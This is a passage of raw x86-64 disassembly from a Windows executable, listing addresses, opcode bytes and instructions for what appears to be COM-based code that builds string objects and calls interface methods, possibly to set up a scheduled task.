   1400025ac:	74 32                	je     0x1400025e0
   1400025ae:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400025b1:	33 c0                	xor    %eax,%eax
   1400025b3:	0f 11 03             	movups %xmm0,(%rbx)
   1400025b6:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400025ba:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400025be:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   1400025c5:	48 8d 0d b8 75 00 00 	lea    0x75b8(%rip),%rcx        # 0x140009b84
   1400025cc:	ff 15 de 6c 00 00    	call   *0x6cde(%rip)        # 0x1400092b0
   1400025d2:	48 89 03             	mov    %rax,(%rbx)
   1400025d5:	48 85 c0             	test   %rax,%rax
   1400025d8:	0f 84 87 07 00 00    	je     0x140002d65
   1400025de:	eb 03                	jmp    0x1400025e3
   1400025e0:	49 8b de             	mov    %r14,%rbx
   1400025e3:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400025e8:	48 85 db             	test   %rbx,%rbx
   1400025eb:	0f 84 b6 07 00 00    	je     0x140002da7
   1400025f1:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400025f5:	48 8b 01             	mov    (%rcx),%rax
   1400025f8:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   1400025fc:	48 8b 13             	mov    (%rbx),%rdx
   1400025ff:	ff 50 38             	call   *0x38(%rax)
   140002602:	8b f0                	mov    %eax,%esi
   140002604:	8b cf                	mov    %edi,%ecx
   140002606:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   14000260b:	83 f9 01             	cmp    $0x1,%ecx
   14000260e:	75 30                	jne    0x140002640
   140002610:	48 8b 0b             	mov    (%rbx),%rcx
   140002613:	48 85 c9             	test   %rcx,%rcx
   140002616:	74 09                	je     0x140002621
   140002618:	ff 15 a2 6c 00 00    	call   *0x6ca2(%rip)        # 0x1400092c0
   14000261e:	4c 89 33             	mov    %r14,(%rbx)
   140002621:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002625:	48 85 c9             	test   %rcx,%rcx
   140002628:	74 09                	je     0x140002633
   14000262a:	e8 b1 48 00 00       	call   0x140006ee0
   14000262f:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002633:	ba 18 00 00 00       	mov    $0x18,%edx
   140002638:	48 8b cb             	mov    %rbx,%rcx
   14000263b:	e8 a0 48 00 00       	call   0x140006ee0
   140002640:	85 f6                	test   %esi,%esi
   140002642:	0f 88 fb 06 00 00    	js     0x140002d43
   140002648:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000264d:	e8 96 48 00 00       	call   0x140006ee8
   140002652:	48 8b d8             	mov    %rax,%rbx
   140002655:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000265a:	48 85 c0             	test   %rax,%rax
   14000265d:	74 32                	je     0x140002691
   14000265f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002662:	33 c0                	xor    %eax,%eax
   140002664:	0f 11 03             	movups %xmm0,(%rbx)
   140002667:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000266b:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000266f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002676:	48 8d 0d 0b 75 00 00 	lea    0x750b(%rip),%rcx        # 0x140009b88
   14000267d:	ff 15 2d 6c 00 00    	call   *0x6c2d(%rip)        # 0x1400092b0
   140002683:	48 89 03             	mov    %rax,(%rbx)
   140002686:	48 85 c0             	test   %rax,%rax
   140002689:	0f 84 e1 06 00 00    	je     0x140002d70
   14000268f:	eb 03                	jmp    0x140002694
   140002691:	49 8b de             	mov    %r14,%rbx
   140002694:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002699:	48 85 db             	test   %rbx,%rbx
   14000269c:	0f 84 05 07 00 00    	je     0x140002da7
   1400026a2:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400026a6:	48 8b 01             	mov    (%rcx),%rax
   1400026a9:	45 33 c0             	xor    %r8d,%r8d
   1400026ac:	48 8b 13             	mov    (%rbx),%rdx
   1400026af:	ff 50 78             	call   *0x78(%rax)
   1400026b2:	90                   	nop
   1400026b3:	8b c7                	mov    %edi,%eax
   1400026b5:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400026ba:	83 f8 01             	cmp    $0x1,%eax
   1400026bd:	75 30                	jne    0x1400026ef
   1400026bf:	48 8b 0b             	mov    (%rbx),%rcx
   1400026c2:	48 85 c9             	test   %rcx,%rcx
   1400026c5:	74 09                	je     0x1400026d0
   1400026c7:	ff 15 f3 6b 00 00    	call   *0x6bf3(%rip)        # 0x1400092c0
   1400026cd:	4c 89 33             	mov    %r14,(%rbx)
   1400026d0:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400026d4:	48 85 c9             	test   %rcx,%rcx
   1400026d7:	74 09                	je     0x1400026e2
   1400026d9:	e8 02 48 00 00       	call   0x140006ee0
   1400026de:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400026e2:	ba 18 00 00 00       	mov    $0x18,%edx
   1400026e7:	48 8b cb             	mov    %rbx,%rcx
   1400026ea:	e8 f1 47 00 00       	call   0x140006ee0
   1400026ef:	4c 89 75 60          	mov    %r14,0x60(%rbp)
   1400026f3:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400026f7:	48 8b 01             	mov    (%rcx),%rax
   1400026fa:	4c 8d 45 60          	lea    0x60(%rbp),%r8
   1400026fe:	33 d2                	xor    %edx,%edx
   140002700:	ff 50 48             	call   *0x48(%rax)
   140002703:	8b d8                	mov    %eax,%ebx
   140002705:	85 c0                	test   %eax,%eax
   140002707:	79 48                	jns    0x140002751
   140002709:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   14000270d:	48 8b 11             	mov    (%rcx),%rdx
   140002710:	ff 52 10             	call   *0x10(%rdx)
   140002713:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002717:	48 8b 11             	mov    (%rcx),%rdx
   14000271a:	ff 52 10             	call   *0x10(%rdx)
   14000271d:	ff 15 f5 6e 00 00    	call   *0x6ef5(%rip)        # 0x140009618
   140002723:	8b c3                	mov    %ebx,%eax
   140002725:	48 8b 8d c0 00 00 00 	mov    0xc0(%rbp),%rcx
   14000272c:	48 33 cc             	xor    %rsp,%rcx
   14000272f:	e8 8c 47 00 00       	call   0x140006ec0
   140002734:	4c 8d 9c 24 d0 01 00 	lea    0x1d0(%rsp),%r11
   14000273b:	00 
   14000273c:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140002740:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140002744:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140002748:	4d 8b 73 28          	mov    0x28(%r11),%r14
   14000274c:	49 8b e3             	mov    %r11,%rsp
   14000274f:	5d                   	pop    %rbp
   140002750:	c3                   	ret
   140002751:	4c 89 b5 88 00 00 00 	mov    %r14,0x88(%rbp)
   140002758:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   14000275c:	48 8b 01             	mov    (%rcx),%rax
   14000275f:	48 8d 95 88 00 00 00 	lea    0x88(%rbp),%rdx
   140002766:	ff 50 38             	call   *0x38(%rax)
   140002769:	85 c0                	test   %eax,%eax
   14000276b:	0f 88 5b 01 00 00    	js     0x1400028cc
   140002771:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002776:	e8 6d 47 00 00       	call   0x140006ee8
   14000277b:	48 8b d8             	mov    %rax,%rbx
   14000277e:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002783:	48 85 c0             	test   %rax,%rax
   140002786:	74 32                	je     0x1400027ba
   140002788:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000278b:	33 c0                	xor    %eax,%eax
   14000278d:	0f 11 03             	movups %xmm0,(%rbx)
   140002790:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002794:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002798:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   14000279f:	48 8d 0d fa 73 00 00 	lea    0x73fa(%rip),%rcx        # 0x140009ba0
   1400027a6:	ff 15 04 6b 00 00    	call   *0x6b04(%rip)        # 0x1400092b0
   1400027ac:	48 89 03             	mov    %rax,(%rbx)
   1400027af:	48 85 c0             	test   %rax,%rax
   1400027b2:	0f 84 c3 05 00 00    	je     0x140002d7b
   1400027b8:	eb 03                	jmp    0x1400027bd
   1400027ba:	49 8b de             	mov    %r14,%rbx
   1400027bd:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400027c2:	48 85 db             	test   %rbx,%rbx
   1400027c5:	0f 84 dc 05 00 00    	je     0x140002da7
   1400027cb:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   1400027d2:	48 8b 01             	mov    (%rcx),%rax
   1400027d5:	48 8b 13             	mov    (%rbx),%rdx
   1400027d8:	ff 50 50             	call   *0x50(%rax)
   1400027db:	90                   	nop
   1400027dc:	8b c7                	mov    %edi,%eax
   1400027de:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400027e3:	83 f8 01             	cmp    $0x1,%eax
   1400027e6:	75 30                	jne    0x140002818
   1400027e8:	48 8b 0b             	mov    (%rbx),%rcx
   1400027eb:	48 85 c9             	test   %rcx,%rcx
   1400027ee:	74 09                	je     0x1400027f9
   1400027f0:	ff 15 ca 6a 00 00    	call   *0x6aca(%rip)        # 0x1400092c0
   1400027f6:	4c 89 33             	mov    %r14,(%rbx)
   1400027f9:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400027fd:	48 85 c9             	test   %rcx,%rcx
   140002800:	74 09                	je     0x14000280b
   140002802:	e8 d9 46 00 00       	call   0x140006ee0
   140002807:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000280b:	ba 18 00 00 00       	mov    $0x18,%edx
   140002810:	48 8b cb             	mov    %rbx,%rcx
   140002813:	e8 c8 46 00 00       	call   0x140006ee0
   140002818:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000281d:	e8 c6 46 00 00       	call   0x140006ee8
   140002822:	48 8b d8             	mov    %rax,%rbx
   140002825:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000282a:	48 85 c0             	test   %rax,%rax
   14000282d:	74 32                	je     0x140002861
   14000282f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002832:	33 c0                	xor    %eax,%eax
   140002834:	0f 11 03             	movups %xmm0,(%rbx)
   140002837:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000283b:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000283f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002846:	48 8d 0d 83 73 00 00 	lea    0x7383(%rip),%rcx        # 0x140009bd0
   14000284d:	ff 15 5d 6a 00 00    	call   *0x6a5d(%rip)        # 0x1400092b0
   140002853:	48 89 03             	mov    %rax,(%rbx)
   140002856:	48 85 c0             	test   %rax,%rax
   140002859:	0f 84 27 05 00 00    	je     0x140002d86
   14000285f:	eb 03                	jmp    0x140002864
   140002861:	49 8b de             	mov    %r14,%rbx
   140002864:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002869:	48 85 db             	test   %rbx,%rbx
   14000286c:	0f 84 35 05 00 00    	je     0x140002da7
   140002872:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   140002879:	48 8b 01             	mov    (%rcx),%rax
   14000287c:	48 8b 13             	mov    (%rbx),%rdx
   14000287f:	ff 50 40             	call   *0x40(%rax)
   140002882:	90                   	nop
   140002883:	8b c7                	mov    %edi,%eax
   140002885:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000288a:	83 f8 01             	cmp    $0x1,%eax
   14000288d:	75 30                	jne    0x1400028bf
   14000288f:	48 8b 0b             	mov    (%rbx),%rcx
   140002892:	48 85 c9             	test   %rcx,%rcx
   140002895:	74 09                	je     0x1400028a0
   140002897:	ff 15 23 6a 00 00    	call   *0x6a23(%rip)        # 0x1400092c0
   14000289d:	4c 89 33             	mov    %r14,(%rbx)
   1400028a0:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400028a4:	48 85 c9             	test   %rcx,%rcx
   1400028a7:	74 09                	je     0x1400028b2
   1400028a9:	e8 32 46 00 00       	call   0x140006ee0
   1400028ae:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400028b2:	ba 18 00 00 00       	mov    $0x18,%edx
   1400028b7:	48 8b cb             	mov    %rbx,%rcx
   1400028ba:	e8 21 46 00 00       	call   0x140006ee0
   1400028bf:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   1400028c6:	48 8b 01             	mov    (%rcx),%rax
   1400028c9:	ff 50 10             	call   *0x10(%rax)
   1400028cc:	4c 89 b5 a0 00 00 00 	mov    %r14,0xa0(%rbp)
   1400028d3:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400028d7:	48 8b 01             	mov    (%rcx),%rax
   1400028da:	48 8d 95 a0 00 00 00 	lea    0xa0(%rbp),%rdx
   1400028e1:	ff 50 48             	call   *0x48(%rax)
   1400028e4:	8b d8                	mov    %eax,%ebx
   1400028e6:	85 c0                	test   %eax,%eax
   1400028e8:	79 23                	jns    0x14000290d
   1400028ea:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400028ee:	48 8b 11             	mov    (%rcx),%rdx
   1400028f1:	ff 52 10             	call   *0x10(%rdx)
   1400028f4:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400028f8:	48 8b 11             	mov    (%rcx),%rdx
   1400028fb:	ff 52 10             	call   *0x10(%rdx)
   1400028fe:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002902:	48 8b 01             	mov    (%rcx),%rax
   140002905:	ff 50 10             	call   *0x10(%rax)
   140002908:	e9 10 fe ff ff       	jmp    0x14000271d
   14000290d:	4c 89 b5 b0 00 00 00 	mov    %r14,0xb0(%rbp)
   140002914:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   14000291b:	48 8b 01             	mov    (%rcx),%rax
   14000291e:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   140002925:	ba 09 00 00 00       	mov    $0x9,%edx
   14000292a:	ff 50 50             	call   *0x50(%rax)
   14000292d:	8b d8                	mov    %eax,%ebx
   14000292f:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   140002936:	48 8b 11             	mov    (%rcx),%rdx
   140002939:	ff 52 10             	call   *0x10(%rdx)
   14000293c:	85 db                	test   %ebx,%ebx
   14000293e:	78 52                	js     0x140002992
   140002940:	48 8b 8d b0 00 00 00 	mov    0xb0(%rbp),%rcx
   140002947:	48 8b 01             	mov    (%rcx),%rax
   14000294a:	ff 50 10             	call   *0x10(%rax)
   14000294d:	4c 89 75 78          	mov    %r14,0x78(%rbp)
   140002951:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002955:	48 8b 01             	mov    (%rcx),%rax
   140002958:	48 8d 55 78          	lea    0x78(%rbp),%rdx
   14000295c:	ff 90 88 00 00 00    	call   *0x88(%rax)
   140002962:	8b d8                	mov    %eax,%ebx
   140002964:	85 c0                	test   %eax,%eax
   140002966:	78 82                	js     0x1400028ea
   140002968:	4c 89 b5 80 00 00 00 	mov    %r14,0x80(%rbp)
   14000296f:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140002973:	48 8b 01             	mov    (%rcx),%rax
   140002976:	4c 8d 85 80 00 00 00 	lea    0x80(%rbp),%r8
   14000297d:	33 d2                	xor    %edx,%edx
   14000297f:	ff 50 60             	call   *0x60(%rax)
   140002982:	8b d8                	mov    %eax,%ebx
   140002984:	85 c0                	test   %eax,%eax
   140002986:	79 2d                	jns    0x1400029b5
   140002988:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   14000298c:	48 8b 11             	mov    (%rcx),%rdx
   14000298f:	ff 52 10             	call   *0x10(%rdx)
   140002992:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002996:	48 8b 11             	mov    (%rcx),%rdx
   140002999:	ff 52 10             	call   *0x10(%rdx)
   14000299c:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400029a0:	48 8b 01             	mov    (%rcx),%rax
   1400029a3:	ff 50 10             	call   *0x10(%rax)
   1400029a6:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400029aa:	48 8b 01             	mov    (%rcx),%rax
   1400029ad:	ff 50 10             	call   *0x10(%rax)
   1400029b0:	e9 68 fd ff ff       	jmp    0x14000271d
   1400029b5:	4c 89 b5 90 00 00 00 	mov    %r14,0x90(%rbp)
   1400029bc:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400029c3:	48 8b 01             	mov    (%rcx),%rax
   1400029c6:	4c 8d 85 90 00 00 00 	lea    0x90(%rbp),%r8
   1400029cd:	48 8d 15 44 6d 00 00 	lea    0x6d44(%rip),%rdx        # 0x140009718
   1400029d4:	ff 10                	call   *(%rax)
   1400029d6:	8b d8                	mov    %eax,%ebx
   1400029d8:	85 c0                	test   %eax,%eax
   1400029da:	79 3a                	jns    0x140002a16
   1400029dc:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400029e3:	48 8b 11             	mov    (%rcx),%rdx
   1400029e6:	ff 52 10             	call   *0x10(%rdx)
   1400029e9:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   1400029ed:	48 8b 11             	mov    (%rcx),%rdx
   1400029f0:	ff 52 10             	call   *0x10(%rdx)
   1400029f3:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400029f7:	48 8b 01             	mov    (%rcx),%rax
   1400029fa:	ff 50 10             	call   *0x10(%rax)
   1400029fd:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002a01:	48 8b 01             	mov    (%rcx),%rax
   140002a04:	ff 50 10             	call   *0x10(%rax)
   140002a07:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002a0b:	48 8b 01             	mov    (%rcx),%rax
   140002a0e:	ff 50 10             	call   *0x10(%rax)
   140002a11:	e9 07 fd ff ff       	jmp    0x14000271d
   140002a16:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002a1b:	e8 c8 44 00 00       	call   0x140006ee8
   140002a20:	48 8b d8             	mov    %rax,%rbx
   140002a23:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002a28:	48 85 c0             	test   %rax,%rax
   140002a2b:	74 32                	je     0x140002a5f
   140002a2d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002a30:	33 c0                	xor    %eax,%eax
   140002a32:	0f 11 03             	movups %xmm0,(%rbx)
   140002a35:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002a39:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002a3d:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002a44:	48 8d 0d b5 71 00 00 	lea    0x71b5(%rip),%rcx        # 0x140009c00
   140002a4b:	ff 15 5f 68 00 00    	call   *0x685f(%rip)        # 0x1400092b0
   140002a51:	48 89 03             	mov    %rax,(%rbx)
   140002a54:	48 85 c0             	test   %rax,%rax
   140002a57:	0f 84 34 03 00 00    	je     0x140002d91
   140002a5d:	eb 03                	jmp    0x140002a62
   140002a5f:	49 8b de             	mov    %r14,%rbx
   140002a62:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002a67:	48 85 db             	test   %rbx,%rbx
   140002a6a:	0f 84 37 03 00 00    	je     0x140002da7
   140002a70:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140002a77:	48 8b 01             	mov    (%rcx),%rax
   140002a7a:	48 8b 13             	mov    (%rbx),%rdx
   140002a7d:	ff 50 58             	call   *0x58(%rax)
   140002a80:	8b f0                	mov    %eax,%esi
   140002a82:	8b cf                	mov    %edi,%ecx
   140002a84:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   140002a89:	83 f9 01             	cmp    $0x1,%ecx
   140002a8c:	75 30                	jne    0x140002abe
   140002a8e:	48 8b 0b             	mov    (%rbx),%rcx
   140002a91:	48 85 c9             	test   %rcx,%rcx
   140002a94:	74 09                	je     0x140002a9f
   140002a96:	ff 15 24 68 00 00    	call   *0x6824(%rip)        # 0x1400092c0
   140002a9c:	4c 89 33             	mov    %r14,(%rbx)
   140002a9f:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002aa3:	48 85 c9             	test   %rcx,%rcx
   140002aa6:	74 09                	je     0x140002ab1
   140002aa8:	e8 33 44 00 00       	call   0x140006ee0
   140002aad:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002ab1:	ba 18 00 00 00       	mov    $0x18,%edx
   140002ab6:	48 8b cb             	mov    %rbx,%rcx
   140002ab9:	e8 22 44 00 00       	call   0x140006ee0
   140002abe:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140002ac5:	48 8b 01             	mov    (%rcx),%rax
   140002ac8:	ff 50 10             	call   *0x10(%rax)
   140002acb:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   140002ad2:	48 8b 01             	mov    (%rcx),%rax
   140002ad5:	ff 50 10             	call   *0x10(%rax)
   140002ad8:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140002adc:	48 8b 01             	mov    (%rcx),%rax
   140002adf:	ff 50 10             	call   *0x10(%rax)
   140002ae2:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002ae6:	85 f6                	test   %esi,%esi
   140002ae8:	0f 88 45 02 00 00    	js     0x140002d33
   140002aee:	4c 89 b5 98 00 00 00 	mov    %r14,0x98(%rbp)
   140002af5:	48 8b 01             	mov    (%rcx),%rax
   140002af8:	48 8d 95 98 00 00 00 	lea    0x98(%rbp),%rdx
   140002aff:	ff 50 58             	call   *0x58(%rax)
   140002b02:	4c 89 b5 a8 00 00 00 	mov    %r14,0xa8(%rbp)
   140002b09:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002b0d:	48 8b 01             	mov    (%rcx),%rax
   140002b10:	48 8d 95 a8 00 00 00 	lea    0xa8(%rbp),%rdx
   140002b17:	ff 50 78             	call   *0x78(%rax)
   140002b1a:	85 c0                	test   %eax,%eax
   140002b1c:	78 5e                	js     0x140002b7c
   140002b1e:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   140002b25:	48 85 c9             	test   %rcx,%rcx
   140002b28:	74 21                	je     0x140002b4b
   140002b2a:	48 8b 01             	mov    (%rcx),%rax
   140002b2d:	ba 01 00 00 00       	mov    $0x1,%edx
   140002b32:	ff 90 90 00 00 00    	call   *0x90(%rax)
   140002b38:	8b d8                	mov    %eax,%ebx
   140002b3a:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   140002b41:	48 8b 11             	mov    (%rcx),%rdx
   140002b44:	ff 52 10             	call   *0x10(%rdx)
   140002b47:	85 db                	test   %ebx,%ebx
   140002b49:	78 31                	js     0x140002b7c
   140002b4b:	8b d7                	mov    %edi,%edx
   140002b4d:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b54:	48 8b 01             	mov    (%rcx),%rax
   140002b57:	ff 90 b0 00 00 00    	call   *0xb0(%rax)
   140002b5d:	33 d2                	xor    %edx,%edx
   140002b5f:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b66:	48 8b 01             	mov    (%rcx),%rax
   140002b69:	ff 90 30 01 00 00    	call   *0x130(%rax)
   140002b6f:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b76:	48 8b 01             	mov    (%rcx),%rax
   140002b79:	ff 50 10             	call   *0x10(%rax)
   140002b7c:	4c 89 b5 b8 00 00 00 	mov    %r14,0xb8(%rbp)
   140002b83:	b8 08 00 00 00       	mov    $0x8,%eax
   140002b88:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   140002b8d:	48 8d 0d b4 70 00 00 	lea    0x70b4(%rip),%rcx        # 0x140009c48
   140002b94:	ff 15 16 67 00 00    	call   *0x6716(%rip)        # 0x1400092b0
   140002b9a:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002b9f:	48 85 c0             	test   %rax,%rax
   140002ba2:	0f 84 0a 02 00 00    	je     0x140002db2
   140002ba8:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   140002bad:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   140002bb1:	f2 0f 10 45 80       	movsd  -0x80(%rbp),%xmm0
   140002bb6:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   140002bbc:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140002bc0:	ff 15 f2 66 00 00    	call   *0x66f2(%rip)        # 0x1400092b8
   140002bc6:	90                   	nop
   140002bc7:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   140002bcb:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   140002bcf:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   140002bd4:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   140002bda:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002bde:	ff 15 d4 66 00 00    	call   *0x66d4(%rip)        # 0x1400092b8
   140002be4:	90                   	nop
   140002be5:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   140002be9:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   140002bed:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   140002bf3:	f2 0f 11 45 50       	movsd  %xmm0,0x50(%rbp)
   140002bf8:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   140002bfc:	0f 29 45 20          	movaps %xmm0,0x20(%rbp)
   140002c00:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   140002c06:	f2 0f 11 45 30       	movsd  %xmm0,0x30(%rbp)
   140002c0b:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   140002c0f:	0f 29 45 00          	movaps %xmm0,0x0(%rbp)
   140002c13:	f2 0f 10 4d b8       	movsd  -0x48(%rbp),%xmm1
   140002c18:	f2 0f 11 4d 10       	movsd  %xmm1,0x10(%rbp)
   140002c1d:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002c22:	e8 c1 42 00 00       	call   0x140006ee8
   140002c27:	48 8b d8             	mov    %rax,%rbx
   140002c2a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002c2f:	48 85 c0             	test   %rax,%rax
   140002c32:	74 32                	je     0x140002c66
   140002c34:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002c37:	33 c0                	xor    %eax,%eax
   140002c39:	0f 11 03             	movups %xmm0,(%rbx)
   140002c3c:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002c40:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002c44:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002c4b:	48 8d 0d 36 6f 00 00 	lea    0x6f36(%rip),%rcx        # 0x140009b88
   140002c52:	ff 15 58 66 00 00    	call   *0x6658(%rip)        # 0x1400092b0
   140002c58:	48 89 03             	mov    %rax,(%rbx)
   140002c5b:	48 85 c0             	test   %rax,%rax
   140002c5e:	0f 84 38 01 00 00    	je     0x140002d9c
   140002c64:	eb 03                	jmp    0x140002c69
   140002c66:	49 8b de             	mov    %r14,%rbx
   140002c69:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002c6e:	48 85 db             	test   %rbx,%rbx
   140002c71:	0f 84 e3 00 00 00    	je     0x140002d5a
   140002c77:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002c7b:	48 8b 01             	mov    (%rcx),%rax
   140002c7e:	48 8d 95 b8 00 00 00 	lea    0xb8(%rbp),%rdx
   140002c85:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140002c8a:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   140002c8e:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140002c93:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   140002c9a:	00 
   140002c9b:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140002c9f:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140002ca4:	48 8d 55 00          	lea    0x0(%rbp),%rdx
   140002ca8:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002cad:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140002cb3:	4c 8b 45 60          	mov    0x60(%rbp),%r8
   140002cb7:	48 8b 13             	mov    (%rbx),%rdx
   140002cba:	ff 90 88 00 00 00    	call   *0x88(%rax)
   140002cc0:	8b f0                	mov    %eax,%esi
   140002cc2:	f0 0f c1 7b 10       	lock xadd %edi,0x10(%rbx)
   140002cc7:	83 ff 01             	cmp    $0x1,%edi
   140002cca:	75 31                	jne    0x140002cfd
   140002ccc:	48 8b 0b             	mov    (%rbx),%rcx
   140002ccf:	48 85 c9             	test   %rcx,%rcx
   140002cd2:	74 09                	je     0x140002cdd
   140002cd4:	ff 15 e6 65 00 00    	call   *0x65e6(%rip)        # 0x1400092c0
   140002cda:	4c 89 33             	mov    %r14,(%rbx)
   140002cdd:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002ce1:	48 85 c9             	test   %rcx,%rcx
   140002ce4:	74 09                	je     0x140002cef
   140002ce6:	e8 f5 41 00 00       	call   0x140006ee0
   140002ceb:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002cef:	ba 18 00 00 00       	mov    $0x18,%edx
